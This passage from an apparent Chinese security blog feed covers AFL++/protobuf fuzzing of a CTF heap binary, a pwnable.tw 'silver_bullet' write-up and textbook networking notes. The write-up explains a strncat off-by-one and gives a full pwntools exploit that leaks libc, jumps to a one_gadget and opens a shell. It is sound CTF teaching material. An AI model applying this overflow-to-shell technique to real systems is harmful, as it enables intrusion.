data.size(), &amp;msg)) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"[afl_custom_post_process] LoadProtoInput Error\n"</span>);   </span><br><span class="line">      <span class="built_in">abort</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 测试变异逻辑</span></span><br><span class="line">    <span class="keyword">void</span>* init_data = afl_custom_init(<span class="literal">nullptr</span>, time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">uint8_t</span> *out_buf = <span class="literal">nullptr</span>;</span><br><span class="line">      <span class="keyword">size_t</span> new_size = afl_custom_fuzz(init_data, (<span class="keyword">uint8_t</span>*)data.c_str(), data.size(),</span><br><span class="line">                                                  &amp;out_buf,  <span class="literal">nullptr</span>, <span class="number">0</span>, data.size() + <span class="number">100</span>);</span><br><span class="line">      <span class="keyword">uint8_t</span> *new_str = <span class="literal">nullptr</span>;</span><br><span class="line">      <span class="keyword">size_t</span> new_str_size = afl_custom_post_process(init_data, out_buf, new_size, &amp;new_str);</span><br><span class="line">      <span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">new_str_str</span><span class="params">((<span class="keyword">char</span>*)new_str, new_str_size)</span></span>;</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; i &lt;&lt; <span class="string">": "</span> &lt;&lt; new_str_str &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    afl_custom_deinit(init_data);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// alloc 12 "[menuctf::AllocChoice]"</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">auto</span> choice = <span class="keyword">new</span> menuctf::AllocChoice();</span><br><span class="line">      choice-&gt;set_size(<span class="number">12</span>);</span><br><span class="line">      choice-&gt;set_content(<span class="string">"[menuctf::AllocChoice]"</span>);</span><br><span class="line"></span><br><span class="line">      msg.add_choice()-&gt;set_allocated_alloc_choice(choice);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// update 2 20 "[menuctf::UpdateChoice]"</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">auto</span> choice = <span class="keyword">new</span> menuctf::UpdateChoice();</span><br><span class="line">      choice-&gt;set_idx(<span class="number">2</span>);</span><br><span class="line">      choice-&gt;set_size(<span class="number">20</span>);</span><br><span class="line">      choice-&gt;set_content(<span class="string">"[menuctf::UpdateChoice]"</span>);</span><br><span class="line"></span><br><span class="line">      msg.add_choice()-&gt;set_allocated_update_choice(choice);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// DeleteChoice 3</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">auto</span> choice = <span class="keyword">new</span> menuctf::DeleteChoice();</span><br><span class="line">      choice-&gt;set_idx(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">      msg.add_choice()-&gt;set_allocated_delete_choice(choice);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ViewChoice 4</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">auto</span> choice = <span class="keyword">new</span> menuctf::ViewChoice();</span><br><span class="line">      choice-&gt;set_idx(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">      msg.add_choice()-&gt;set_allocated_view_choice(choice);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ExitChoice</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">auto</span> choice = <span class="keyword">new</span> menuctf::ExitChoice();</span><br><span class="line"></span><br><span class="line">      msg.add_choice()-&gt;set_allocated_exit_choice(choice);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::ofstream <span class="title">output_file</span><span class="params">(<span class="string">"output.bin"</span>, <span class="built_in">std</span>::ios::binary)</span></span>;</span><br><span class="line">    <span class="comment">// 这里保存的 Serialize 必须使用 Partial 保存，</span></span><br><span class="line">    msg.SerializePartialToOstream(&amp;output_file);</span><br><span class="line">    output_file.close();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// std::cout &lt;&lt; "msg DebugString: " &lt;&lt; msg.DebugString() &lt;&lt; std::endl;</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">stringstream</span> stream;</span><br><span class="line">  ProtoToDataHelper(stream, msg);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; stream.str() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>接下来只需在 <code>afl-libprotobuf-mutator</code> 文件夹下执行 <code>./build.sh &amp;&amp; make</code>即可，完成后，在当前工作路径下将会生成 <code>dumper</code>、<code>libmutator.so</code>以及<code>mutator</code>三个文件。我们可以利用 dumper 对上面的代码进行测试，<a href="http://libmutator.so" target="_blank" rel="noopener">libmutator.so</a> 用于 afl++ 中的自定义变异。</p>
</li>
</ul>
<h3 id="3-配置-AFL">3. 配置 AFL++</h3>
<p>现在压力来到了 AFL++ 这里（笑），我们先试试看能不能马上跑起来。</p>
<p>尝试执行以下命令来构建 AFL++：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 构建 AFLplusplus</span></span><br><span class="line"><span class="comment"># 1. 安装依赖项</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y ninja-build build-essential python3-dev automake git flex bison libglib2.0-dev libpixman-1-dev python3-setuptools</span><br><span class="line"><span class="comment"># try to install llvm 11 and install the distro default if that fails</span></span><br><span class="line">sudo apt-get install -y lld-11 llvm-11 llvm-11-dev clang-11 || sudo apt-get install -y lld llvm llvm-dev clang </span><br><span class="line">sudo apt-get install -y gcc-$(gcc --version|head -n1|sed <span class="string">'s/.* //'</span>|sed <span class="string">'s/\..*//'</span>)-plugin-dev libstdc++-$(gcc --version|head -n1|sed <span class="string">'s/.* //'</span>|sed <span class="string">'s/\..*//'</span>)-dev</span><br><span class="line"><span class="comment"># 2. 开始构建</span></span><br><span class="line"><span class="built_in">cd</span> AFLplusplus</span><br><span class="line">make distrib <span class="comment"># 这一步要等一段时间</span></span><br><span class="line"><span class="comment"># sudo make install # 将 AFL++ 安装至本机</span></span><br><span class="line"><span class="comment"># 如果不需要了可以使用 sudo make uninstall 卸载</span></span><br></pre></td></tr></table></figure>
<h3 id="4-运行">4. 运行</h3>
<p>执行以下命令运行 AFL++：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># AFL++ 构建完成后，进入 workdir 配置语料</span></span><br><span class="line">mkdir workdir</span><br><span class="line">[配置语料等等...]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置相关环境变量</span></span><br><span class="line"><span class="built_in">export</span> AFL_CUSTOM_MUTATOR_ONLY=1 <span class="comment"># 禁用除自定义 mutator 以外的其他自带 mutator</span></span><br><span class="line"><span class="built_in">export</span> AFL_CUSTOM_MUTATOR_LIBRARY=../afl-libprotobuf-mutator/libmutator.so <span class="comment"># 指定自定义路径</span></span><br><span class="line"><span class="built_in">export</span> AFL_USE_QASAN=1  <span class="comment"># 启用 QASAN</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行 AFL++</span></span><br><span class="line">AFLplusplus/afl-fuzz -i workdir/fuzz_input -o workdir/fuzz_output -Q -- ./babyheap</span><br></pre></td></tr></table></figure>
<p>别忘记在 workdir 中放点输入语料，语料可以通过 <code>afl-libprotobuf-mutator/dumper</code> 来随便生成一点。</p>
<p>运行时如果遇到 <code>afl-quemu-trace</code> 不存在，则单独执行<code>AFLplusplus/qemu_mode/build_qemu_support.sh</code> 构建即可。</p>
<h2 id="三、源代码">三、源代码</h2>
<p>相关源代码以及构建方式已开源至 <a href="https://github.com/Kiprey/protobuf_ctf_fuzz" target="_blank" rel="noopener">github</a> 上。</p>
<h2 id="四、可改进的地方">四、可改进的地方</h2>
<ol>
<li>libprotobuf-mutator 的变异效果一般，最好手动改进一下</li>
<li>需要实现一下 trim 逻辑，空的 trim 逻辑可能会产生 <strong>样例爆炸</strong></li>
</ol>
<h2 id="五、一些需要注意的点">五、一些需要注意的点</h2>
<p>如果在运行 AFL++ 后，发现 fuzz 始终无法发现新路径，即路径始终只有一个，那么就必须考虑<strong>目标CTF文件是否可执行</strong>。以当前的 babyheap2021 为例，笔者在测试时初始 AFL++ 状态如下：</p>
<p><img src="/2021/09/protobuf_ctf_fuzz/image-20210927082401830.png" alt="image-20210927082401830"></p>
<p>尝试直接执行 babyheap，发现 <code>Permission Denied</code>无法执行。但即便赋以 excutable 权限，仍然无法执行，报错 <code>no such file or directory</code>：</p>
<p><img src="/2021/09/protobuf_ctf_fuzz/image-20210927082630107.png" alt="image-20210927082630107"></p>
<p>这一看，要么是架构问题，要么是 <a href="http://libc.so" target="_blank" rel="noopener">libc.so</a> / <a href="http://ld.so" target="_blank" rel="noopener">ld.so</a> 的问题。因此执行以下命令以更新 babyheap 所使用的 <a href="http://libc.so" target="_blank" rel="noopener">libc.so</a> &amp; <a href="http://ld.so" target="_blank" rel="noopener">ld.so</a>，之后便可以正常执行。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">patchelf --<span class="built_in">set</span>-interpreter /lib64/ld-linux-x86-64.so.2 ./babyheap</span><br><span class="line">patchelf --replace-needed libc.so libc.so.6 ./babyheap</span><br></pre></td></tr></table></figure>
<p>跑起来效果，还行？（不是很懂.jpg）</p>
<p><img src="/2021/09/protobuf_ctf_fuzz/image-20210927112534183.png" alt="image-20210927112534183"></p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>Pwn</tag>
        <tag>fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwnable.tw 部分题解-2</title>
    <url>/2021/09/pwnable-tw-2/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>这里将保存部分做过的 <a href="http://pwnable.tw" target="_blank" rel="noopener">pwnable.tw</a> 的题解。</p>
<a id="more"></a>
<h2 id="一、silver-bullet">一、silver_bullet</h2>
<h3 id="1-环境配置">1. 环境配置</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">patchelf --replace-needed ./libc_32.so.6 /home/Kiprey/Desktop/Pwn/libc_32.so.6 ./silver_bullet</span><br><span class="line">patchelf --<span class="built_in">set</span>-interpreter /mylibs/2.23-0ubuntu10_i386/ld-2.23.so ./silver_bullet</span><br></pre></td></tr></table></figure>
<h3 id="2-查看保护">2. 查看保护</h3>
<p><img src="/2021/09/pwnable-tw-2/image-20210909104505396.png" alt="image-20210909104505396"></p>
<p>No canary &amp;&amp; No PIE.</p>
<h3 id="3-运行流程">3. 运行流程</h3>
<ul>
<li>
<p>在 <code>create_bullet</code> 函数中，程序会要求用户输入一串字符串，并放置长度至特定位置。</p>
<p><img src="/2021/09/pwnable-tw-2/image-20210909135701700.png" alt="image-20210909135701700"></p>
<blockquote>
<p>这里看汇编会比伪代码更清楚一点</p>
</blockquote>
<p>可以看到，程序将读入的字符串放入 <code>char s[0x30]</code>的缓冲区中，并将其长度放至 <code>s[0x30]</code> 地址上。</p>
</li>
<li>
<p>而在 <code>power_up</code> 函数中，程序会额外读入 <code>0x30-strlen(s)</code>的字符串，并拼接至原先的缓冲区字符串上。</p>
<p><img src="/2021/09/pwnable-tw-2/image-20210909140110048.png" alt="image-20210909140110048"></p>
<p>关键的漏洞点在于<code>strncat</code>这个函数的使用。通过查阅 Linux Manual Page，我们可以很容易的得到这样的一段话：</p>
<blockquote>
<p><strong>If src contains n or more bytes, strncat() writes n+1 bytes to dest</strong> (n from  src  plus  the  terminating  null byte).  Therefore, <strong>the size of dest must be at least strlen(dest)+n+1.</strong></p>
</blockquote>
<p>因此此处将会有一个 off-by-one 的漏洞，<strong>将存储字符串长度的内存位置覆盖为0</strong>，因此若下一次执行<code>power_up</code>函数时，由于长度被覆盖为0，因此仍然可以继续拼接字符串至原先的字符串上，而这就造成了<strong>栈溢出</strong>。</p>
</li>
<li>
<p>对于栈溢出的利用，我们自然希望 main 函数可以正常 return，这样就可以利用被修改的 ret addr 来跳转至任意位置。但 main 函数若要正常 return，则需要让函数 <code>beat</code> 的返回值为1。</p>
<p><img src="/2021/09/pwnable-tw-2/image-20210909151949446.png" alt="image-20210909151949446"></p>
<p>其中，怪物的血量为 0x7fffffff，而子弹的攻击值为 存放在s[0x30]。我们可以在 <code>power_up</code>  栈溢出时，先将 s[0x30] 覆盖为一个超大值，这样经过一番执行，最终的 s[0x30] 就是一个超大值:</p>
<p><img src="/2021/09/pwnable-tw-2/image-20210909152350997.png" alt="image-20210909152350997"></p>
<p>这样最终我们便可以达到从 main 函数返回的目的。</p>
</li>
<li>
<p>栈溢出利用，我们可以先泄露 GOT 上的函数地址，算出 libc 基地址，最后算出 system 函数以及 bin_sh 的地址，然后跳转回 main 函数，重新覆盖 ret addr 为 system，并执行 /bin/sh。或者用 one_gadget 一把梭也很酸爽。</p>
</li>
</ul>
<h3 id="4-Exploit">4. Exploit</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ELFname = <span class="string">"./silver_bullet"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    io = remote(<span class="string">"chall.pwnable.tw"</span>, <span class="number">10103</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(ELFname)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line">e = ELF(ELFname)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> msg, content : io.sendlineafter(msg, content)</span><br><span class="line">sl = <span class="keyword">lambda</span> content : io.sendline(content)</span><br><span class="line">rv = <span class="keyword">lambda</span> x=<span class="literal">None</span> : io.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> msg : io.recvuntil(msg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(msg = <span class="string">""</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">        gdb.attach(io, msg)</span><br><span class="line"></span><br><span class="line">context(terminal=[<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'bash'</span>, <span class="string">'-c'</span>], os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_bullet</span><span class="params">(bullet)</span>:</span></span><br><span class="line">    sla(<span class="string">"Your choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    sla(<span class="string">"Give me your description of bullet :"</span>, bullet)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">power_up</span><span class="params">(bullet)</span>:</span></span><br><span class="line">    sla(<span class="string">"Your choice :"</span>, <span class="string">"2"</span>)</span><br><span class="line">    sla(<span class="string">"Give me your another description of bullet :"</span>, bullet)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">beat</span><span class="params">()</span>:</span></span><br><span class="line">    sla(<span class="string">"Your choice :"</span>, <span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line">one_gadget_offset = <span class="number">0x5f065</span> <span class="comment"># 1. esi is the GOT address of libc; 2. eax == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">buffoverflow</span><span class="params">(data)</span>:</span></span><br><span class="line">        create_bullet(<span class="string">"a"</span>*<span class="number">0x20</span>)</span><br><span class="line">        power_up(<span class="string">"a"</span>*<span class="number">0x10</span>)</span><br><span class="line">        power_up(<span class="string">"\xff\xff\x7f"</span> + <span class="string">"a"</span>*<span class="number">4</span> + data)</span><br><span class="line">        beat()</span><br><span class="line">        beat()</span><br><span class="line">    </span><br><span class="line">    buffoverflow(flat(p32(e.plt[<span class="string">"printf"</span>]), </span><br><span class="line">                      p32(e.symbols[<span class="string">'main'</span>]), </span><br><span class="line">                      p32(e.got[<span class="string">"puts"</span>])))</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">"Oh ! You win !!\n"</span>)</span><br><span class="line">    debug()</span><br><span class="line">    puts_got = u32(rv(<span class="number">4</span>))</span><br><span class="line">    log.info(<span class="string">"puts got addr: "</span> + hex(puts_got))</span><br><span class="line"></span><br><span class="line">    libc_base = puts_got - libc.symbols[<span class="string">"puts"</span>]</span><br><span class="line">    log.info(<span class="string">"libc base addr: "</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">    one_gadget_addr = libc_base + one_gadget_offset</span><br><span class="line">    log.info(<span class="string">"one_gadget addr: "</span> + hex(one_gadget_addr))</span><br><span class="line"></span><br><span class="line">    buffoverflow(p32(one_gadget_addr))</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>Pwn</tag>
        <tag>pwnable.tw</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机网络笔记-1</title>
    <url>/2021/05/cnatda-1/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<ul>
<li>这里记录了笔者阅读《计算机网络：自顶向下方法》的一些笔记。笔记有所缩略。</li>
<li>主要关于
<ul>
<li>第一章：计算机网络和因特网</li>
<li>第二章：应用层</li>
<li>第三章：运输层</li>
</ul>
</li>
</ul>
<a id="more"></a>
<h2 id="第一章：计算机网络和因特网">第一章：计算机网络和因特网</h2>
<ul>
<li>
<p>所有的联网设备称为<strong>主机（host）<strong>或者</strong>端系统（end system）</strong>。</p>
</li>
<li>
<p>端系统通过<strong>通信链路communication link</strong>和<strong>分组交换机packet switch</strong>相连。</p>
<ul>
<li>分组交换机中最著名的两种是<strong>路由器router</strong>和<strong>链路层交换机link-layer switch</strong>。</li>
<li>一个分组所经历的一系列<strong>通信链路</strong>和<strong>分组交换机</strong>称为通过该网络的<strong>路径route/path</strong>。</li>
</ul>
</li>
<li>
<p>网络核心</p>
<blockquote>
<p>通过网络链路和交换机移动数据有两种基本方法：<strong>电路交换</strong>和<strong>分组交换</strong>。</p>
</blockquote>
<ul>
<li>
<p>分组交换：</p>
<p><img src="/2021/05/cnatda-1/image-20210507194417422.png" alt="image-20210507194417422"></p>
<ul>
<li>
<p>在各种网络应用中，端系统彼此交换<strong>报文message</strong>，报文能够包含协议设计者需要的任何东西，例如控制功能、数据等。</p>
</li>
<li>
<p>为了从源端系统向目的端系统发送一个报文，源将长报文划分为较小的数据块，称之为<strong>分组packet。</strong></p>
</li>
<li>
<p>多数分组交换机在链路的输入端使用<strong>存储转发传输store-and-forward transmission机制</strong>。指的是在交换机能够开始向输出链路传输该分组的第一个比特之前，必须接收到整个分组。</p>
<p><img src="/2021/05/cnatda-1/image-20210507193626489.png" alt="image-20210507193626489"></p>
</li>
<li>
<p>排队时延和分组丢失</p>
<ul>
<li>每台分组交换机有多条链路与之相连。对于每条相连的链路，该分组交换机具有一个<strong>输出缓存/输出队列</strong>，用于存储路由器准备发往那条链路的分组。</li>
<li>如果到达的分组需要传输到某条链路，但发现该链路正忙于传输其他分组，该到达分组必须在输出缓存中等待，因此除了存储转发时延以外，分组还要承受输出缓存的<strong>排队时延</strong>。如果该缓存已被完全装装满，则将出现<strong>分组丢失packet loss</strong>。</li>
</ul>
</li>
</ul>
</li>
<li>
<p>电路交换</p>
<ul>
<li>
<p>当两台主机通信时，该网络在两台主机之间创建一条专用的端到端连接。因此必须在两条链路的每条上先预留一条电路。</p>
<p><img src="/2021/05/cnatda-1/image-20210507194445844.png" alt="image-20210507194445844"></p>
</li>
<li>
<p>电路交换网络中的复用</p>
<blockquote>
<p>链路中的电路是通过<strong>频分复用FDM</strong>或<strong>时分复用TDM</strong>来实现。</p>
</blockquote>
<ul>
<li>
<p>对于频分复用FDM来说，链路的频谱由跨越链路创建的所有连接共享，为每个连接<strong>专用一个频段</strong>，例如收音机。</p>
</li>
<li>
<p>对于时分复用TDM来说，时间被划分为固定区间的帧，每帧被划分为固定数量的时隙。网络跨越一条链路创建一条连接时，网络在每个帧中为该连接指定一个时隙。这些时隙专门由该链接单独使用。</p>
</li>
</ul>
<p><img src="/2021/05/cnatda-1/image-20210507195514761.png" alt="image-20210507195514761"></p>
</li>
</ul>
</li>
<li>
<p>分组交换比电路交换更有效：</p>
<ul>
<li>提供更好的带宽共享。</li>
<li>更简单、有效，成本更低。</li>
</ul>
<p>电路交换不考虑需求，而预先分配了传输链路的使用，使得效率较低。分组交换按需分配链路使用，效率较高。</p>
</li>
</ul>
</li>
<li>
<p>分组交换的时延</p>
<ul>
<li>
<p><strong>节点处理时延</strong>：检查分组首部和决定将该分组导向何处所需要的时间，以及检查比特级别的差错等时间。</p>
</li>
<li>
<p><strong>排队时延</strong>：在队列中，当分组在链路上等待传输时，它经受排队时延。一个特定分组的排队时延长度取决于先期到达的正在排队等待向链路传输的分组数量。</p>
</li>
<li>
<p><strong>传输时延</strong>：传输时延是将<strong>特定分组的所有比特</strong>，<strong>发射进链路</strong>所需要的时间。传输时延与分组大小呈正相关。</p>
</li>
<li>
<p><strong>传播时延</strong>：从该链路的起点到下一个路由器传播所需要的时间。</p>
<blockquote>
<p>注意：传输时延和传播时延不是一回事，两者概念完全不同。</p>
</blockquote>
</li>
</ul>
<blockquote>
<p>四个相加即<strong>总时延</strong>。$d_{nodal}=d_{proc}+d_{queue}+d_{trans}+d_{prop}$</p>
</blockquote>
</li>
<li>
<p>协议分层</p>
<ul>
<li>
<p><strong>应用层</strong>：网络应用程序以及他们的应用层协议存留的地方，例如http、smtp等。</p>
</li>
<li>
<p><strong>运输层</strong>：运输层在应用程序端点之间传送应用层报文，有以下两种运输协议：</p>
<ul>
<li><strong>TCP</strong>：将长报文划分为短报文，提供拥塞控制机制。</li>
<li><strong>UDP</strong>：向应用程序提供无连接服务，不提供不必要服务，没有可靠性，没有流量控制，没有拥塞控制。</li>
</ul>
<p>将运输层的分组称为<strong>报文段segment</strong>。</p>
</li>
<li>
<p><strong>网络层</strong>：网络层负责将称为<strong>数据报datagram</strong>的网络层分组从一台主机移动到另一台主机。<strong>网络层包括著名网际协议IP。</strong></p>
</li>
<li>
<p><strong>链路层</strong>：网络层通过源和目的地之间的一系列路由器来 <strong>路由（注意这是动词）</strong> 数据报。为了将分组从一个结点移动到路径上的下一个结点，网络层必须依靠该链路层的服务。</p>
<p>将链路层分组称为<strong>帧frame</strong>。链路层的任务是将<strong>整个帧</strong>从一个网络元素移动到邻近的网络元素。该层协议与链路层相关。</p>
</li>
<li>
<p><strong>物理层</strong>：物理层的任务是将每个帧中的一个个比特从一个节点移动到下一个节点。该层协议与链路相关，并进一步与链路的<strong>实际传输媒体</strong>相关，例如双绞铜线、单模光纤等。</p>
</li>
</ul>
<p>各层的所有协议称为<strong>协议栈</strong>。</p>
<p><img src="/2021/05/cnatda-1/image-20210507202004763.png" alt="image-20210507202004763"></p>
</li>
</ul>
<h2 id="第二章：应用层">第二章：应用层</h2>
<h3 id="1-因特网提供的运输服务">1. 因特网提供的运输服务</h3>
<ul>
<li>
<p>TCP服务</p>
<ul>
<li>
<p><strong>面向连接的服务</strong>：</p>
<p>在应用层数据报文开始流动之前，TCP让客户和服务器互相交换<strong>运输层</strong>控制信息。这个握手过程提醒客户和服务器为大量分组的到来做好准备。</p>
<p>三次握手完成后，一个<strong>TCP连接</strong>就在两个进程之间建立，该连接是<strong>全双工</strong>的，即连接的双方可以在此连接上<strong>同时进行报文的收发</strong>。</p>
<p>当应用程序结束报文发送时，必须拆除该连接。</p>
</li>
<li>
<p><strong>可靠的数据传送服务</strong>：</p>
<p>通信进程能够依靠TCP，无差错、按顺序交付所有发送的数据，无字节丢失或冗余。</p>
</li>
<li>
<p>具有拥塞控制机制。</p>
</li>
</ul>
<blockquote>
<p><strong>安全套接字SSL</strong>：TCP的加强版本，即加密版本。</p>
<p>SSL有自己的套接字API，应用向SSL套接字传递明文数据，发送主机中SSL加密该数据并将加密后数据传递给<strong>发送端TCP套接字</strong>。接收端套接字接收到加密数据，将其解密，并通过SSL套接字将明文数据传递给接收进程。</p>
</blockquote>
</li>
<li>
<p>UDP服务</p>
<ul>
<li>是一种不提供不必要服务的轻量级运输协议，仅提供最小服务。</li>
<li>UDP是无连接的，因此两进程通信前没有握手过程。</li>
<li>UDP协议提供不可靠数据传送服务，即UDP协议<strong>不保证报文到达接受进程</strong>，同时接收到的报文也<strong>可能是乱序的</strong>。无拥塞控制机制。</li>
</ul>
</li>
</ul>
<h3 id="2-应用层协议">2. 应用层协议</h3>
<h4 id="a-http">a. http</h4>
<ul>
<li>
<p><strong>请求报文</strong>样例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;somedir&#x2F;page.html HTTP&#x2F;1.1</span><br><span class="line">Host: www.someschool.edu</span><br><span class="line">Connection: close</span><br><span class="line">User-agent: Mozilla&#x2F;5.0</span><br><span class="line">Accept-language: fr</span><br></pre></td></tr></table></figure>
<p>具体<strong>请求报文</strong>通用格式如下：</p>
<p><img src="/2021/05/cnatda-1/image-20210507204906032.png" alt="image-20210507204906032"></p>
</li>
<li>
<p><strong>响应报文</strong>样例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Connection: close</span><br><span class="line">Date: Tue, 18 Aug 2015 15:44:04 GMT</span><br><span class="line">Server: Apache&#x2F;2.23 (CentOS)</span><br><span class="line">Last-Modified: Tue, 18 Aug 2015 15:11:03 GMT</span><br><span class="line">Content-Length: 6821</span><br><span class="line">Content-Type: text&#x2F;html</span><br><span class="line"></span><br><span class="line">(data data data data data ...)</span><br></pre></td></tr></table></figure>
<p>具体通用格式如下：</p>
<p><img src="/2021/05/cnatda-1/image-20210507205312687.png" alt="image-20210507205312687"></p>
</li>
<li>
<p><strong>web 缓存</strong></p>
<ul>
<li>
<p>Web缓存也称代理服务器，其工作流程如下：</p>
<ul>
<li>
<p>浏览器创建一个到Web缓存器的TCP连接，并向Web缓存器中的对象发送一个 HTTP 请求。</p>
</li>
<li>
<p>Web缓存器进行检查</p>
<ul>
<li>
<p>如果本地存储了对象副本，则Web缓存器向客户浏览器用HTTP响应报文返回该对象。</p>
</li>
<li>
<p>如果没有存储该对象，则打开一个与该对象的初始服务器的TCP连接，并在该连接上发起一个HTTP请求。受到请求后，初始服务器向该web缓存器发送具有该对象的http响应。</p>
<p>当Web缓存器接收到对象后，在本地存储空间存储一份副本，并向客户的浏览器用HTTP响应报文发送该副本。</p>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>存放在Web缓存器中的对象副本可能是陈旧的，而http协议允许缓存器证实它的对象是最新的，即<strong>条件GET</strong>方法：</p>
<ul>
<li>请求报文使用 GET 方法</li>
<li>请求报文中包含一个 If-Modified-Since 首部行</li>
</ul>
<p>如果Web缓存器向初始服务器发送<strong>条件get</strong>报文时：</p>
<ul>
<li>目标对象没有发生改变，则响应报文中的body为空。</li>
<li>目标对象已经改变，响应报文中存放新的对象。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="b-DNS">b. DNS</h4>
<ul>
<li>
<p>主机的一种标识方式是使用其<strong>主机名hostname</strong>。</p>
</li>
<li>
<p>DNS是</p>
<ul>
<li>一个由分层的DNS服务器实现的分布式数据库。</li>
<li>一个使得主机能够查询分布式数据库的应用层协议。</li>
</ul>
</li>
<li>
<p>DNS提供的服务</p>
<ul>
<li>
<p><strong>主机名到IP地址的转换</strong></p>
</li>
<li>
<p><strong>主机别名</strong>：有着复杂主机名的主机能够拥有一个或多个别名。</p>
<p>例如一台名为<code>relay1.west-coast.enterprise.com</code>的主机，可能还有两个别名为<code>enterprise.com</code>和<code>www.enterprise.com</code>的主机。在这种情况下，<code>relay1.west-coast.enterprise.com</code>也称为<strong>规范主机名canonical hostname</strong>。主机别名比主机规范名更加容易记忆。</p>
</li>
<li>
<p><strong>邮件服务器别名</strong>：电子邮件应用程序可以调用DNS，对提供的主机名别名进行解析，以获得该主机的规范主机名及其IP地址。</p>
</li>
<li>
<p><strong>负载分配</strong>：DNS也用在冗余的服务器之间进行负载分配。</p>
</li>
</ul>
</li>
<li>
<p>DNS工作机理概述</p>
<ul>
<li>
<p>分布式、层次数据库</p>
<ul>
<li>为了处理扩展性问题，DNS使用了大量的DNS服务器，以层次方式组织。</li>
<li>有三种类型的DNS服务器
<ul>
<li><strong>根DNS服务器</strong>：提供顶级域服务器的ID地址。</li>
<li><strong>顶级域（Top-Level Domain）DNS服务器</strong>：对于每个顶级域（例如com、org、net等）和所有国家的顶级域（如uk、fr等），都有TLD服务器。TLD服务器提供权威DNS服务器的IP地址。</li>
